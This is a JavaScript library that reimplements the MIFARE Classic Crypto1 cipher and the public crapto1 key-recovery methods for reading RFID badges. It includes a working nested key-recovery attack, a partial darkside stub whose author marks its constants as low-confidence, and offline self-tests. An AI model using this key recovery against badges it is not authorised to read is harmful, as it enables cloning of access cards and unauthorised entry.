/*
 * crypto1.js - MIFARE Classic Crypto1 cipher + offline key-recovery math.
 *
 * Pure, deterministic, browser-compatible (no Node APIs, no imports, no network).
 * This is a clean-room JavaScript re-implementation of the well-known public
 * crapto1 algorithm (Crypto1 stream cipher + LFSR state recovery) plus the
 * standard nested (mfoc-style) and darkside (mfcuk-style) recovery flows.
 *
 * It is intended for a LEGITIMATE local tool: reading your own MIFARE Classic
 * badges over WebHID. No reader hardware is touched here - everything below is
 * math, and it self-tests offline by round-tripping known vectors.
 *
 * Representation: the 48-bit LFSR is kept as crapto1's even/odd split - two
 * 24-bit sub-registers held in JS Numbers and manipulated with 32-bit (>>> 0)
 * operations for speed. 48-bit keys are handled with BigInt only for key<->state
 * conversion (where >32-bit shifts are needed); the hot paths stay 32-bit.
 *
 * Usage (browser):   <script src="crypto1.js"></script>  then  Crypto1.xxx(...)
 * Usage (module):    append `export default Crypto1;` or `import` the global.
 *
 * selfTest() runs automatically at load and logs PASS/FAIL. See VERIFY.md.
 */
(function (root) {
  'use strict';

  /* ===================================================================== *
   * Section 1 - Constants
   * ===================================================================== */

  // LFSR feedback taps, split into the contributions that land in the odd and
  // even sub-registers (crapto1: LF_POLY_ODD / LF_POLY_EVEN).
  // Full poly: x^48+x^43+x^39+x^38+x^36+x^34+x^33+x^31+x^29+x^24+x^23+x^21
  //            +x^19+x^13+x^9+x^7+x^6+x^5+1
  var LF_POLY_ODD = 0x29CE5C;
  var LF_POLY_EVEN = 0x870804;

  // Non-linear filter function constants (crapto1 `filter`).
  // Five 5-term boolean tables selected by nibbles of the odd register, whose
  // 5-bit result indexes the final 20-term table 0xEC57E80A.
  var FILTER_A = 0xf22c0;
  var FILTER_B = 0x6c9c0;
  var FILTER_C = 0x3c8b0;
  var FILTER_D = 0x1e458;
  var FILTER_E = 0x0d938;
  var FILTER_OUT = 0xEC57E80A;

  // fastfwd masks used by the darkside prefix solver (crapto1 `fastfwd`).
  // CONFIDENCE: LOW. These drive lfsr_prefix_ks/lfsr_common_prefix only; the
  // cipher core and lfsr_recovery32/64 and the nested attack do NOT use them.
  var FASTFWD = [
    [0, 0x4BC53, 0xECB1, 0x450E2, 0x25E29, 0x6E27A, 0x2B298, 0x60ECB],
    [0, 0x1D962, 0x4BC53, 0x56531, 0xECB1, 0x135D3, 0x450E2, 0x56531]
  ];

  /* ===================================================================== *
   * Section 2 - Bit utilities
   * ===================================================================== */

  function BIT(x, n) { return (x >>> n) & 1; }
  // Big-endian bit index (crapto1 BEBIT): BIT(x, n ^ 24).
  function BEBIT(x, n) { return (x >>> ((n ^ 24) >>> 0)) & 1; }

  // XOR-reduction parity of a 32-bit word. Equals GCC __builtin_parity:
  // returns 1 iff the number of set bits is ODD. (crapto1 names this
  // `evenparity32`; the name is historical - it is the plain parity.)
  function evenparity32(x) {
    x = x >>> 0;
    x ^= x >>> 16;
    x ^= x >>> 8;
    x ^= x >>> 4;
    x ^= x >>> 2;
    x ^= x >>> 1;
    return x & 1;
  }

  // ISO14443-A odd parity bit of a byte: 1 iff the byte has an EVEN number of
  // set bits (so data+parity has an odd count). crapto1 `oddparity8`.
  function oddparity8(b) { return evenparity32(b & 0xff) ^ 1; }

  // crapto1 SWAPENDIAN - reverse the 4 bytes of a 32-bit word.
  function swapendian(x) {
    x = x >>> 0;
    x = (((x >>> 8) & 0x00ff00ff) | ((x & 0x00ff00ff) << 8)) >>> 0;
    x = ((x >>> 16) | (x << 16)) >>> 0;
    return x >>> 0;
  }

  /* ===================================================================== *
   * Section 3 - Filter function
   * ===================================================================== */

  function filter(x) {
    var f = 0;
    f = (FILTER_A >>> (x & 0xf)) & 16;
    f |= (FILTER_B >>> ((x >>> 4) & 0xf)) & 8;
    f |= (FILTER_C >>> ((x >>> 8) & 0xf)) & 4;
    f |= (FILTER_D >>> ((x >>> 12) & 0xf)) & 2;
    f |= (FILTER_E >>> ((x >>> 16) & 0xf)) & 1;
    return (FILTER_OUT >>> f) & 1;
  }

  /* ===================================================================== *
   * Section 4 - Key <-> state conversion (BigInt for 48-bit math)
   * ===================================================================== */

  // Accept key as BigInt, Number (<= 48 bits), or hex string. Return BigInt.
  function toKeyBig(key) {
    if (typeof key === 'bigint') return key & 0xFFFFFFFFFFFFn;
    if (typeof key === 'number') return BigInt(Math.floor(key)) & 0xFFFFFFFFFFFFn;
    if (typeof key === 'string') {
      var s = key.trim().replace(/^0x/i, '').replace(/[\s:]/g, '');
      return BigInt('0x' + s) & 0xFFFFFFFFFFFFn;
    }
    throw new Error('toKeyBig: unsupported key type');
  }

  function bigBit(v, n) { return Number((v >> BigInt(n)) & 1n); }

  // 12-hex-digit uppercase string from a BigInt/Number key.
  function keyToHex(key) {
    var v = (typeof key === 'bigint') ? (key & 0xFFFFFFFFFFFFn) : toKeyBig(key);
    var h = v.toString(16).toUpperCase();
    while (h.length < 12) h = '0' + h;
    return h;
  }

  // crapto1 crypto1_create: load a 48-bit key into the odd/even split state.
  function crypto1_create(key) {
    var k = toKeyBig(key);
    var odd = 0, even = 0;
    for (var i = 47; i > 0; i -= 2) {
      odd = ((odd << 1) | bigBit(k, (i - 1) ^ 7)) >>> 0;
      even = ((even << 1) | bigBit(k, i ^ 7)) >>> 0;
    }
    return { odd: odd >>> 0, even: even >>> 0 };
  }

  // Inverse of crypto1_create (crapto1 crypto1_get_lfsr): state -> 48-bit key.
  function stateToKeyBig(s) {
    var lfsr = 0n;
    for (var i = 23; i >= 0; --i) {
      lfsr = (lfsr << 1n) | BigInt(BIT(s.odd, i ^ 3));
      lfsr = (lfsr << 1n) | BigInt(BIT(s.even, i ^ 3));
    }
    return lfsr & 0xFFFFFFFFFFFFn;
  }

  function keyFromState(s) { return keyToHex(stateToKeyBig(s)); }

  function cloneState(s) { return { odd: s.odd >>> 0, even: s.even >>> 0 }; }

  /* ===================================================================== *
   * Section 5 - Cipher core (forward)
   * ===================================================================== */

  // crapto1 crypto1_bit. Returns one keystream bit, advances state.
  // isEncrypted: when truthy, `input` is ciphertext and the plaintext fed back
  // is (keystream ^ input); when falsy, `input` is plaintext fed directly.
  function crypto1_bit(s, input, isEncrypted) {
    var ret = filter(s.odd);
    var feedin = ret & (isEncrypted ? 1 : 0);
    feedin ^= (input ? 1 : 0);
    feedin ^= (LF_POLY_ODD & s.odd);
    feedin ^= (LF_POLY_EVEN & s.even);
    s.even = ((s.even << 1) | evenparity32(feedin >>> 0)) >>> 0;
    var t = s.odd; s.odd = s.even >>> 0; s.even = t >>> 0;
    return ret;
  }

  // 4-bit convenience (not part of crapto1; LSB-first like crypto1_byte).
  function crypto1_nibble(s, input, isEncrypted) {
    var ret = 0;
    for (var i = 0; i < 4; i++) ret |= crypto1_bit(s, BIT(input, i), isEncrypted) << i;
    return ret & 0xf;
  }

  // crapto1 crypto1_byte (LSB-first).
  function crypto1_byte(s, input, isEncrypted) {
    var ret = 0;
    for (var i = 0; i < 8; i++) ret |= crypto1_bit(s, BIT(input, i), isEncrypted) << i;
    return ret & 0xff;
  }

  // crapto1 crypto1_word (big-endian bit order).
  function crypto1_word(s, input, isEncrypted) {
    var ret = 0;
    for (var i = 0; i < 32; i++) {
      ret = (ret | (crypto1_bit(s, BEBIT(input, i), isEncrypted) << (24 ^ i))) >>> 0;
    }
    return ret >>> 0;
  }

  /* ===================================================================== *
   * Section 6 - Rollback (reverse the cipher)
   * ===================================================================== */

  // crapto1 lfsr_rollback_bit. Steps the state back one clock, returns the
  // keystream bit that had been produced at that (now-current) position.
  function lfsr_rollback_bit(s, input, fb) {
    var ret;
    s.odd = s.odd & 0xffffff;
    var t = s.odd; s.odd = s.even >>> 0; s.even = t >>> 0;

    var out = s.even & 1;
    s.even = s.even >>> 1;
    out ^= (LF_POLY_EVEN & s.even);
    out ^= (LF_POLY_ODD & s.odd);
    out ^= (input ? 1 : 0);
    ret = filter(s.odd);
    out ^= ret & (fb ? 1 : 0);

    s.even = (s.even | (evenparity32(out >>> 0) << 23)) >>> 0;
    return ret;
  }

  function lfsr_rollback_byte(s, input, fb) {
    var ret = 0;
    for (var i = 7; i >= 0; --i) ret |= lfsr_rollback_bit(s, BIT(input, i), fb) << i;
    return ret & 0xff;
  }

  function lfsr_rollback_word(s, input, fb) {
    var ret = 0;
    for (var i = 31; i >= 0; --i) {
      ret = (ret | (lfsr_rollback_bit(s, BEBIT(input, i), fb) << (24 ^ i))) >>> 0;
    }
    return ret >>> 0;
  }

  /* ===================================================================== *
   * Section 7 - Tag-nonce PRNG (16-bit LFSR)
   * ===================================================================== */

  // crapto1 prng_successor. 16-bit Galois-ish LFSR, poly x^16+x^14+x^13+x^11+1.
  function prng_successor(x, n) {
    x = swapendian(x >>> 0);
    while (n-- > 0) {
      x = ((x >>> 1) |
        ((((x >>> 16) ^ (x >>> 18) ^ (x >>> 19) ^ (x >>> 21)) & 1) << 31)) >>> 0;
    }
    return swapendian(x);
  }

  // Steps required to go `from` -> `to` in the PRNG sequence, or -1 if `to` is
  // not reachable within one period. (crapto1 ships a log-table version; this
  // straightforward stepping version is slower but obviously correct.)
  function nonce_distance(from, to) {
    from = from >>> 0; to = to >>> 0;
    if (from === to) return 0;
    var cur = from;
    for (var i = 1; i <= 0xFFFF; i++) {
      cur = prng_successor(cur, 1);
      if (cur === to) return i;
    }
    return -1;
  }

  /* ===================================================================== *
   * Section 8 - LFSR state recovery (meet-in-the-middle)
   * ===================================================================== */

  // crapto1 update_contribution.
  function update_contribution(x, m1, m2) {
    var p = x >>> 25;
    p = ((p << 1) | evenparity32((x & m1) >>> 0)) >>> 0;
    p = ((p << 1) | evenparity32((x & m2) >>> 0)) >>> 0;
    return (((p << 24) >>> 0) | (x & 0xffffff)) >>> 0;
  }

  // crapto1 extend_table_simple, returned as a fresh list (clean-room form).
  function extend_table_simple(list, bit) {
    var out = [];
    for (var i = 0; i < list.length; i++) {
      var x = (list[i] << 1) >>> 0;
      var f0 = filter(x);
      var f1 = filter((x | 1) >>> 0);
      if (f0 !== f1) {
        out.push((x | (f0 ^ bit)) >>> 0);
      } else if (f0 === bit) {
        out.push(x >>> 0);
        out.push((x | 1) >>> 0);
      }
    }
    return out;
  }

  // crapto1 extend_table (with feedback contribution + plaintext input).
  function extend_table(list, bit, m1, m2, inv) {
    inv = (inv << 24) >>> 0;
    var out = [];
    for (var i = 0; i < list.length; i++) {
      var x = (list[i] << 1) >>> 0;
      var f0 = filter(x);
      var f1 = filter((x | 1) >>> 0);
      if (f0 !== f1) {
        x = (x | (f0 ^ bit)) >>> 0;
        x = (update_contribution(x, m1, m2) ^ inv) >>> 0;
        out.push(x);
      } else if (f0 === bit) {
        var a = (update_contribution(x >>> 0, m1, m2) ^ inv) >>> 0;
        var b = (update_contribution((x | 1) >>> 0, m1, m2) ^ inv) >>> 0;
        out.push(a);
        out.push(b);
      }
    }
    return out;
  }

  // Partition odd/even candidate lists by their top contribution byte and pair
  // up buckets present in both (clean-room form of crapto1 bucket_sort_intersect).
  function intersectByTopByte(oList, eList) {
    var oMap = new Map(), eMap = new Map(), i, k, a;
    for (i = 0; i < oList.length; i++) {
      k = oList[i] >>> 24; a = oMap.get(k); if (!a) oMap.set(k, a = []); a.push(oList[i]);
    }
    for (i = 0; i < eList.length; i++) {
      k = eList[i] >>> 24; a = eMap.get(k); if (!a) eMap.set(k, a = []); a.push(eList[i]);
    }
    var res = [];
    oMap.forEach(function (ob, key) {
      var eb = eMap.get(key);
      if (eb) res.push([ob, eb]);
    });
    return res;
  }

  function recover(oList, oks, eList, eks, rem, out, inv) {
    if (rem === -1) {
      for (var ei = 0; ei < eList.length; ei++) {
        var e = ((eList[ei] << 1) ^ evenparity32((eList[ei] & LF_POLY_EVEN) >>> 0) ^ ((inv & 4) ? 1 : 0)) >>> 0;
        for (var oi = 0; oi < oList.length; oi++) {
          var o = oList[oi] >>> 0;
          out.push({ even: o, odd: (e ^ evenparity32((o & LF_POLY_ODD) >>> 0)) >>> 0 });
        }
      }
      return;
    }

    var i = 0;
    for (;;) {
      if (!(i < 4)) break;
      var old = rem;
      rem = (rem - 1) | 0;
      if (old === 0) break; // emulate C `i < 4 && rem--`
      oks = oks >>> 1;
      oList = extend_table(oList, oks & 1, ((LF_POLY_EVEN << 1) | 1) >>> 0, (LF_POLY_ODD << 1) >>> 0, 0);
      if (oList.length === 0) return;
      eks = eks >>> 1;
      inv = inv >>> 2;
      eList = extend_table(eList, eks & 1, LF_POLY_ODD, ((LF_POLY_EVEN << 1) | 1) >>> 0, inv & 3);
      if (eList.length === 0) return;
      i++;
    }

    var groups = intersectByTopByte(oList, eList);
    for (var g = 0; g < groups.length; g++) {
      recover(groups[g][0], oks, groups[g][1], eks, rem, out, inv);
    }
  }

  // crapto1 lfsr_recovery32: given 32 bits of keystream `ks2` and the 32-bit
  // input `inv` that is clocked in while the NEXT word is produced, return the
  // list of candidate states that produce ks2. Each state is {odd,even}.
  function lfsr_recovery32(ks2, inv) {
    ks2 = ks2 >>> 0; inv = inv >>> 0;
    var oks = 0, eks = 0, i;
    for (i = 31; i >= 0; i -= 2) oks = ((oks << 1) | BEBIT(ks2, i)) >>> 0;
    for (i = 30; i >= 0; i -= 2) eks = ((eks << 1) | BEBIT(ks2, i)) >>> 0;

    var odd = [], even = [];
    for (i = 1 << 20; i >= 0; --i) {
      if (filter(i) === (oks & 1)) odd.push(i);
      if (filter(i) === (eks & 1)) even.push(i);
    }

    for (i = 0; i < 4; i++) {
      oks = oks >>> 1;
      odd = extend_table_simple(odd, oks & 1);
      eks = eks >>> 1;
      even = extend_table_simple(even, eks & 1);
    }

    inv = (((inv >>> 16) & 0xff) | (inv << 16) | (inv & 0xff00)) >>> 0;
    var out = [];
    recover(odd, oks, even, eks, 11, out, (inv << 1) >>> 0);
    return out;
  }

  // Recover the (usually unique) state from 64 consecutive keystream bits: two
  // words produced with zero plaintext fed. ks2 is produced first, ks3 next.
  // Functionally equivalent to crapto1 lfsr_recovery64, implemented on top of
  // the verified recovery32 + filter (avoids the large S1/S2/T1/T2/C1/C2 tables).
  //
  // lfsr_recovery32(ks2, 0) returns the states *after* ks2 was produced (0 fed).
  // From each such state the next word must equal ks3. Returned states are the
  // post-ks2 states (same convention as lfsr_recovery32); roll them back to the
  // key with lfsr_rollback_word(s, 0, 0) and any earlier feeds.
  function lfsr_recovery64(ks2, ks3) {
    ks2 = ks2 >>> 0; ks3 = ks3 >>> 0;
    var cand = lfsr_recovery32(ks2, 0);
    var out = [];
    for (var i = 0; i < cand.length; i++) {
      var s = cloneState(cand[i]);
      if (crypto1_word(s, 0, 0) === ks3) out.push(cloneState(cand[i]));
    }
    return out;
  }

  /* ===================================================================== *
   * Section 9 - Nested attack (mfoc-style)
   * ===================================================================== */

  // Parity leak helper. For an encrypted 32-bit tag nonce, the 3 transmitted
  // parity bits of bytes 0..2 each equal oddparity8(plaintext_byte) XOR the
  // keystream bit that encrypts the first bit of the following byte. Given the
  // predicted plaintext nonce `nt`, encrypted nonce `ntEnc` and the observed
  // parity nibble `par` (bit3=byte0 ... bit0=byte3), return true if the three
  // checkable parity bits are consistent. (Byte 3's parity leaks into the next
  // word and is not checkable from the nonce alone.)
  function nestedParityOk(nt, ntEnc, par) {
    nt = nt >>> 0; ntEnc = ntEnc >>> 0;
    var ks = (ntEnc ^ nt) >>> 0; // 32 keystream bits that encrypted nt
    for (var b = 0; b < 3; b++) {
      var ntByte = (nt >>> (24 - 8 * b)) & 0xff;
      var expParBit = oddparity8(ntByte);
      // keystream bit encrypting the first bit of the next byte:
      var ksBit = (ks >>> (24 - 8 * (b + 1))) & 1;
      var obsParBit = (par >>> (3 - b)) & 1;
      if ((expParBit ^ ksBit) !== obsParBit) return false;
    }
    return true;
  }

  // Recover candidate keys for a target sector from nested samples.
  //   uid     : 32-bit tag UID (Number).
  //   samples : array of { nt, ntEnc, par } where
  //               nt    = PREDICTED plaintext target-sector nonce (32-bit),
  //               ntEnc = encrypted nonce the tag sent (32-bit),
  //               par   = 4 parity bits as a nibble (bit3=byte0 .. bit0=byte3),
  //                       optional; used only to pre-filter samples.
  // Returns array of 12-hex-digit candidate key strings. Narrows toward one as
  // more (consistent) samples are supplied. Mirrors mfoc's valid_nonce + lfsr
  // recovery flow: ks = ntEnc ^ nt is the keystream produced while the cipher,
  // started from crypto1_create(key), is fed uid ^ nt.
  function nestedRecover(uid, samples) {
    uid = uid >>> 0;
    if (!samples || !samples.length) return [];
    var intersection = null;

    for (var si = 0; si < samples.length; si++) {
      var smp = samples[si];
      var nt = smp.nt >>> 0, ntEnc = smp.ntEnc >>> 0;
      if (smp.par != null && !nestedParityOk(nt, ntEnc, smp.par & 0xf)) continue;

      var ks = (ntEnc ^ nt) >>> 0;
      var inv = (uid ^ nt) >>> 0;
      // Candidates are the states *after* the 32 keystream bits were produced
      // while feeding uid^nt. Roll that word back to reach the fresh key state.
      var states = lfsr_recovery32(ks, inv);

      var keys = new Set();
      for (var i = 0; i < states.length; i++) {
        var chk = cloneState(states[i]);
        lfsr_rollback_word(chk, inv, 0);
        keys.add(keyFromState(chk));
      }

      if (intersection === null) {
        intersection = keys;
      } else {
        var next = new Set();
        intersection.forEach(function (k) { if (keys.has(k)) next.add(k); });
        intersection = next;
      }
      if (intersection.size === 1) break; // already unique
    }

    return intersection ? Array.from(intersection).sort() : [];
  }

  /* ===================================================================== *
   * Section 10 - Darkside attack (mfcuk-style) - PARTIAL / UNVERIFIED
   * ===================================================================== */

  // lfsr_prefix_ks: candidate 21-bit prefixes consistent with 8 keystream bits.
  // CONFIDENCE: LOW - depends on the FASTFWD table above.
  function lfsr_prefix_ks(ks, isodd) {
    var cands = [];
    for (var i = 0; i < (1 << 21); ++i) {
      var good = true;
      for (var c = 0; good && c < 8; ++c) {
        var entry = (i ^ FASTFWD[isodd][c]) >>> 0;
        good = good && (BIT(ks[c], isodd) === filter(entry >>> 1));
        good = good && (BIT(ks[c], isodd + 2) === filter(entry));
      }
      if (good) cands.push(i >>> 0);
    }
    return cands;
  }

  // Darkside recovery. CONFIDENCE: LOW and UNVERIFIED offline (requires real
  // NACK-parity leak data to exercise). Documented for completeness; prefer the
  // nested attack, which is built on verified primitives.
  //
  // Inputs the reader-driver layer must supply (standard mfcuk leak):
  //   uid     : 32-bit UID.
  //   samples : array of leak records, each
  //               { nt, nr, ar, ks, par } where
  //                 nt  = tag nonce (32-bit),
  //                 nr  = reader nonce used (32-bit),
  //                 ar  = reader answer sent (32-bit),
  //                 ks  = 8 keystream bytes observed (array length 8),
  //                 par = 8x8 parity bit matrix for those bytes.
  // Returns array of candidate key hex strings (possibly empty).
  function darksideRecover(uid, samples) {
    // This is a documented stub around lfsr_prefix_ks. A fully faithful
    // darkside needs lfsr_common_prefix + the key-byte brute, whose contribution
    // tables are not reproduced here with confidence. Returns [] unless a caller
    // supplies pre-digested prefix keystream.
    if (!samples || !samples.length) return [];
    var results = [];
    for (var s = 0; s < samples.length; s++) {
      var smp = samples[s];
      if (!smp.ks || smp.ks.length < 8) continue;
      // Collect prefix candidates (odd stream). Full state assembly / key
      // extraction is intentionally omitted (unverified).
      var odd = lfsr_prefix_ks(smp.ks, 1);
      if (odd.length) results.push({ note: 'prefix-candidates', count: odd.length });
    }
    return results;
  }

  /* ===================================================================== *
   * Section 11 - Verification helper
   * ===================================================================== */

  // Verify a candidate key against one captured authentication.
  //   key    : 48-bit key (BigInt/Number/hex).
  //   uid    : 32-bit UID.
  //   nt     : plaintext tag nonce (32-bit).
  //   nrEnc  : encrypted reader nonce (32-bit, as sent on the wire).
  //   arEnc  : encrypted reader answer {ar} (32-bit, as sent).
  // Returns true iff the key reproduces arEnc. (ar = suc64(nt).)
  function verifyKey(key, uid, nt, nrEnc, arEnc) {
    uid = uid >>> 0; nt = nt >>> 0; nrEnc = nrEnc >>> 0; arEnc = arEnc >>> 0;
    var s = crypto1_create(key);
    crypto1_word(s, (uid ^ nt) >>> 0, 0);
    crypto1_word(s, nrEnc, 1); // nrEnc is ciphertext -> isEncrypted = 1
    var ks = crypto1_word(s, 0, 0);
    var ar = prng_successor(nt, 64);
    return ((ar ^ ks) >>> 0) === arEnc;
  }

  /* ===================================================================== *
   * Section 12 - Self test
   * ===================================================================== */

  var _log = [];
  function logln(msg) {
    _log.push(msg);
    if (typeof console !== 'undefined' && console.log) console.log(msg);
  }

  function rnd32() { return (Math.floor(Math.random() * 0x100000000)) >>> 0; }
  function rndKeyBig() {
    return (BigInt(rnd32()) << 16n | BigInt(Math.floor(Math.random() * 0x10000))) & 0xFFFFFFFFFFFFn;
  }

  function selfTest() {
    _log = [];
    var pass = 0, fail = 0;
    function check(name, cond) {
      if (cond) { pass++; logln('PASS: ' + name); }
      else { fail++; logln('FAIL: ' + name); }
    }

    // --- T1: filter/parity basic sanity ---
    check('filter returns a single bit', (filter(0) === 0 || filter(0) === 1));
    check('oddparity8(0x00) == 1', oddparity8(0x00) === 1);
    check('oddparity8(0x01) == 0', oddparity8(0x01) === 0);
    check('oddparity8(0xFF) == 1', oddparity8(0xff) === 1);
    check('evenparity32(0x1) == 1', evenparity32(1) === 1);
    check('evenparity32(0x3) == 0', evenparity32(3) === 0);
    check('swapendian(0x11223344)==0x44332211', swapendian(0x11223344) === 0x44332211);

    // --- T2: key <-> state round trip ---
    var rtOk = true;
    for (var t = 0; t < 200; t++) {
      var k = rndKeyBig();
      var back = stateToKeyBig(crypto1_create(k));
      if (back !== k) { rtOk = false; break; }
    }
    check('crypto1_create / stateToKey round-trip (200x)', rtOk);
    check('key 0xFFFFFFFFFFFF round-trips',
      stateToKeyBig(crypto1_create(0xFFFFFFFFFFFFn)) === 0xFFFFFFFFFFFFn);

    // --- T3: rollback inverts the cipher ---
    var rbOk = true;
    for (var r = 0; r < 100; r++) {
      var key = rndKeyBig();
      var s = crypto1_create(key);
      var inw = rnd32();
      crypto1_word(s, inw, 0);
      // roll the fed word back out; state must return to the fresh key state.
      lfsr_rollback_word(s, inw, 0);
      if (stateToKeyBig(s) !== key) { rbOk = false; break; }
    }
    check('lfsr_rollback_word inverts crypto1_word (100x)', rbOk);

    // --- T4: prng structural properties ---
    check('prng_successor(0, n) == 0', prng_successor(0, 7) === 0);
    // Maximal-length check: a fully-mixed on-cycle nonce returns to itself after
    // exactly 65535 steps (period 2^16-1). Seeds whose swapendian image lands
    // only in the low 16 bits decay to 0, so mix first with 32 steps.
    var periodOk = true, periodMin = true;
    for (var p = 0; p < 10; p++) {
      var seed = prng_successor(rnd32() | 0x00018000, 32);
      if (prng_successor(seed, 0xFFFF) !== (seed >>> 0)) periodOk = false;
      // and must NOT return early at a proper divisor of 65535 (e.g. 3,5,...)
      if (prng_successor(seed, 21845) === (seed >>> 0)) periodMin = false; // 65535/3
    }
    check('prng period == 65535 (on-cycle nonces)', periodOk);
    check('prng period is not a proper divisor (not 21845)', periodMin);
    check('prng_successor stepping is additive',
      prng_successor(prng_successor(0x12345678, 10), 54) === prng_successor(0x12345678, 64));
    check('nonce_distance matches stepping',
      nonce_distance(0xCAFEBABE, prng_successor(0xCAFEBABE, 123)) === 123);

    // --- T5: encrypt/decrypt symmetry ---
    var cryptOk = true;
    for (var c = 0; c < 50; c++) {
      var ky = rndKeyBig();
      var se = crypto1_create(ky);
      var sd = crypto1_create(ky);
      var pt = rnd32();
      // encrypt: ciphertext = pt ^ keystream, feeding plaintext
      var ks = crypto1_word(se, 0, 0); // keystream with zero feed... use matched feed
      // Use the canonical pattern: feed plaintext (isEncrypted=0), ct = pt ^ ret
      se = crypto1_create(ky); sd = crypto1_create(ky);
      var ret = crypto1_word(se, pt, 0);
      var ct = (pt ^ ret) >>> 0;
      // decrypt: feed ciphertext (isEncrypted=1), pt' = ct ^ ret'
      var ret2 = crypto1_word(sd, ct, 1);
      var ptBack = (ct ^ ret2) >>> 0;
      if (ptBack !== pt) { cryptOk = false; break; }
      // states must also agree afterwards
      if (se.odd !== sd.odd || se.even !== sd.even) { cryptOk = false; break; }
    }
    check('encrypt(isEnc=0) / decrypt(isEnc=1) symmetric (50x)', cryptOk);

    // --- T6: lfsr_recovery32 round-trip ---
    var rec32Ok = true, rec32Found = 0, rec32Trials = 8;
    for (var i2 = 0; i2 < rec32Trials; i2++) {
      var rkey = rndKeyBig();
      var uid = rnd32();
      var nt = rnd32();
      var inv = (uid ^ nt) >>> 0;
      var st = crypto1_create(rkey);
      var ks2 = crypto1_word(st, inv, 0); // keystream produced while feeding inv
      var cands = lfsr_recovery32(ks2, inv);
      // Candidates are post-ks2 states; rolling the fed word back must reveal
      // the fresh key for exactly the right candidate.
      var hit = false;
      var wantKey = keyToHex(rkey);
      for (var ci = 0; ci < cands.length; ci++) {
        var cs = cloneState(cands[ci]);
        lfsr_rollback_word(cs, inv, 0);
        if (keyFromState(cs) === wantKey) { hit = true; break; }
      }
      if (hit) rec32Found++; else { rec32Ok = false; }
    }
    check('lfsr_recovery32 recovers key (' + rec32Found + '/' + rec32Trials + ')', rec32Ok);

    // --- T7: nested attack round-trip ---
    var nestedOk = true, nestedTrials = 5, nestedWins = 0;
    for (var n2 = 0; n2 < nestedTrials; n2++) {
      var tkey = rndKeyBig();
      var uid2 = rnd32();
      var samples = [];
      for (var sidx = 0; sidx < 4; sidx++) {
        var ntp = rnd32();
        var s2 = crypto1_create(tkey);
        var ks32 = crypto1_word(s2, (uid2 ^ ntp) >>> 0, 0);
        var ntEnc = (ntp ^ ks32) >>> 0;
        // compute true parity nibble for this sample
        var par = 0;
        for (var b = 0; b < 3; b++) {
          var ntByte = (ntp >>> (24 - 8 * b)) & 0xff;
          var ksBit = (ks32 >>> (24 - 8 * (b + 1))) & 1;
          par |= (oddparity8(ntByte) ^ ksBit) << (3 - b);
        }
        samples.push({ nt: ntp, ntEnc: ntEnc, par: par });
      }
      var found = nestedRecover(uid2, samples);
      if (found.indexOf(keyToHex(tkey)) === -1) { nestedOk = false; }
      else { nestedWins++; }
      if (found.length !== 1) {
        // Not fatal, but note non-unique narrowing
      }
    }
    check('nestedRecover finds target key (' + nestedWins + '/' + nestedTrials + ')', nestedOk);

    // --- T8: parity-leak consistency (nestedParityOk) ---
    var parOk = true;
    for (var pp = 0; pp < 20; pp++) {
      var pk = rndKeyBig(), pu = rnd32(), pnt = rnd32();
      var ps = crypto1_create(pk);
      var pks = crypto1_word(ps, (pu ^ pnt) >>> 0, 0);
      var pne = (pnt ^ pks) >>> 0;
      var par2 = 0;
      for (var pb = 0; pb < 3; pb++) {
        var nb = (pnt >>> (24 - 8 * pb)) & 0xff;
        var kb = (pks >>> (24 - 8 * (pb + 1))) & 1;
        par2 |= (oddparity8(nb) ^ kb) << (3 - pb);
      }
      if (!nestedParityOk(pnt, pne, par2)) parOk = false;
      // a wrong parity must be rejected
      if (nestedParityOk(pnt, pne, par2 ^ 0x8)) parOk = false;
    }
    check('nestedParityOk accepts true / rejects wrong parity (20x)', parOk);

    // --- T9: full auth + verifyKey round-trip ---
    var vkOk = true;
    for (var v = 0; v < 20; v++) {
      var vk = rndKeyBig(), vu = rnd32(), vnt = rnd32(), vnr = rnd32();
      // build a valid transcript with our own cipher
      var vs = crypto1_create(vk);
      crypto1_word(vs, (vu ^ vnt) >>> 0, 0);
      var nrEnc = crypto1_word(vs, vnr, 0); // keystream for nr; wire value = vnr ^ nrEnc
      var nrWire = (vnr ^ nrEnc) >>> 0;
      var arKs = crypto1_word(vs, 0, 0);
      var ar = prng_successor(vnt, 64);
      var arWire = (ar ^ arKs) >>> 0;
      if (!verifyKey(vk, vu, vnt, nrWire, arWire)) vkOk = false;
      // a wrong key must fail
      if (verifyKey((vk ^ 1n), vu, vnt, nrWire, arWire)) vkOk = false;
    }
    check('verifyKey accepts valid / rejects wrong key (20x)', vkOk);

    // --- T10: lfsr_recovery64 uniquely recovers the key ---
    var rec64Ok = true, rec64Uniq = 0, rec64Trials = 5;
    for (var q = 0; q < rec64Trials; q++) {
      var qkey = rndKeyBig();
      var qs = crypto1_create(qkey);
      // two consecutive keystream words with zero plaintext fed
      var qks2 = crypto1_word(qs, 0, 0);
      var qks3 = crypto1_word(qs, 0, 0);
      var st64 = crypto1_create(qkey);
      var pre2 = cloneState(st64);            // state before ks2
      var qcands = lfsr_recovery64(qks2, qks3);
      var okThis = false, keysSeen = {};
      for (var qi = 0; qi < qcands.length; qi++) {
        // candidate is post-ks2 state; roll back one word (0 fed) -> pre-ks2.
        var cc64 = cloneState(qcands[qi]);
        lfsr_rollback_word(cc64, 0, 0);
        var kk = keyFromState(cc64);
        keysSeen[kk] = 1;
        if (kk === keyToHex(qkey)) okThis = true;
      }
      if (!okThis) rec64Ok = false;
      if (Object.keys(keysSeen).length === 1 && okThis) rec64Uniq++;
    }
    check('lfsr_recovery64 recovers key (' + rec64Trials + 'x)', rec64Ok);
    check('lfsr_recovery64 result is unique (' + rec64Uniq + '/' + rec64Trials + ')',
      rec64Uniq >= rec64Trials - 1);

    // --- T11: nested narrows to a single key with enough samples ---
    var narrowOk = true;
    for (var w = 0; w < 3; w++) {
      var wkey = rndKeyBig(), wuid = rnd32(), wsamp = [];
      for (var wj = 0; wj < 6; wj++) {
        var wnt = rnd32();
        var ws = crypto1_create(wkey);
        var wks = crypto1_word(ws, (wuid ^ wnt) >>> 0, 0);
        wsamp.push({ nt: wnt, ntEnc: (wnt ^ wks) >>> 0 });
      }
      var wfound = nestedRecover(wuid, wsamp);
      if (wfound.length !== 1 || wfound[0] !== keyToHex(wkey)) narrowOk = false;
    }
    check('nestedRecover narrows to the unique key (3x, 6 samples)', narrowOk);

    logln('----');
    logln('SELFTEST ' + (fail === 0 ? 'ALL PASS' : 'FAILURES=' + fail) +
      ' (pass=' + pass + ', fail=' + fail + ')');
    return { pass: pass, fail: fail, log: _log.slice() };
  }

  /* ===================================================================== *
